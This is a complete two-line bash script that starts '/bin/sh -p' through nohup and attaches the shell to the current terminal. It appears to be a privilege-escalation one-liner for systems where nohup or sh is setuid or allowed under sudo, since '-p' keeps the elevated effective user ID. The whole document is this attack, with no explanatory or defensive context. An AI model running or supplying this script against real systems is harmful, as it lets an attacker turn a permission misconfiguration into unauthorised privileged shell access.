#!/bin/bash

nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
